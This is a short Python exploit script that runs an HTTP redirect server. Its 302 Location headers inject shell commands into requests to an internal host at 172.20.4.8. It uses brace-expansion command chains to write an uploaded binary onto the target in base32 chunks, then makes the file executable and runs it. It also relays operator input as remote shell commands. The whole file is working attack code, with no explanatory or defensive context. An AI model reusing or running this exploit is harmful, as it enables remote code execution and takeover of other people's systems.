import os, sys, readline, base64, tempfile, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

filename = tempfile.mktemp()
contents = base64.b32encode(open(sys.argv[1],"rb").read())
MAX_BUFFER = 1000
chunks = [contents[i:i+MAX_BUFFER] for i in range(0, len(contents), MAX_BUFFER)]
chunk_index = 0
start_shell = False

class Redirect(BaseHTTPRequestHandler):
    def do_POST(self):
        global filename, contents, MAX_BUFFER, chunks, chunk_index, start_shell
        try:
            os.write(
                tempfile.mkstemp()[0],
                self.rfile.read(int(self.headers.getheader('Content-Length'))))
        except:
            print("post sans body")
        self.send_response(302)
        print("req: " + self.path)
        if self.path == '/fdr' and not start_shell:
            if chunk_index < len(chunks):
                chunk = chunks[chunk_index].decode()
                chunk_index += 1
                cmd = "{echo,-n,%s}|{base32,-d}|{tee,-a,%s}" % (chunk, filename)
            else:
                cmd = "{chmod,0777,%s};%s"%(filename, filename)
                start_shell = True
            print("res: " + cmd)
            self.send_header('Location', "http://172.20.4.8:23/;%s;"%(cmd))
        else:
            self.send_header('Location', 'http://172.20.4.8:23/id')
        self.end_headers()

    def do_GET(self):
        print("req(get): " + self.path)
        self.send_response(302)
        if self.path.startswith('/out/'):
            self.send_header('Location',
                             'http://172.20.4.8:9980/' +
                             urllib.parse.quote(
                                 input('shell: \n' +
                                       urllib.parse.unquote(
                                           self.path
                                       ) + '\n > ')))
        self.end_headers()

print("Waiting for first request..")

HTTPServer(("", 80), Redirect).serve_forever()
